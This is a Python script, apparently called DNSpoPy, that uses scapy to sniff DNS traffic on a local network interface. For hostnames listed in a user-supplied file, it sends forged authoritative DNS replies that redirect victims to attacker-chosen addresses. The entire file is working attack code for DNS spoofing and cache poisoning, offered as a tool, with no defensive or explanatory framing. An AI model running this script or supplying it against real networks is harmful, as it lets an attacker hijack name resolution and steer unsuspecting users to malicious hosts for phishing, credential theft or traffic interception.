#import pcap
#import dpkt
#import dnet
from scapy.all import *
import getopt

lo_addr = '127.0.0.1'
hostnames_specified = False
poison_map = {}
def poison_cache(pkt):
	global hostnames_specified
	if IP in pkt:
		ip_src = pkt[IP].src
		ip_dst = pkt[IP].dst
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
			
	if pkt.haslayer(DNSQR): # DNS question record
		query = pkt[DNS].qd
		print query.qname
#		targets = [each for each in poison_map.keys() if each in query.qname][0]
#		if len(targets) > 0:
#			for each in targets:
		if (hostnames_specified and (query.qname in poison_map.keys())):
			poison_addr = poison_map[query.qname]
			print "Preparing spoofed packet"	
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                     UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                     DNS(id=pkt[DNS].id, qd=query, aa = 1, qr=1, \
                     an=DNSRR(rrname=query.qname,  ttl=10, rdata=poison_addr))
			send(spoofed_pkt)
			print 'Sent:', spoofed_pkt.summary()

def main():
	global hostnames_specified
	interface = "en0"
	try:
		opt, exp = getopt.getopt(sys.argv[1:], "i:h:", ["interface", "hostname"])
	
	except getopt.GetoptError as err:
		print "DNSpoPy: Usage Error:",
		print str(err)  # will print something like "option -a not recognized"
		sys.exit(2)
	
	for o, a in opt:
		if o in ("-i", "--interface"):
			interface = a
			print "interface: " + a
		elif o in ("-h", "--hostname"):
			hostnames_specified = True
			print "hostname: " + a
			host_file = a
		else:
			assert False, "Option not recognized"
	if hostnames_specified:
		print "Reading Cache poisoning data from file " + host_file + " ..."
		with open(host_file, "r") as hostfile:
			for each_entry in hostfile:
				dns_map = each_entry.split()
				poison_map[dns_map[1] + "."] = dns_map[0]
	
	print "Poison Map: " + str(poison_map)
	
	sniff(iface = interface, filter = "port 53", prn = poison_cache, store = 0)

if __name__ == "__main__":
	main()

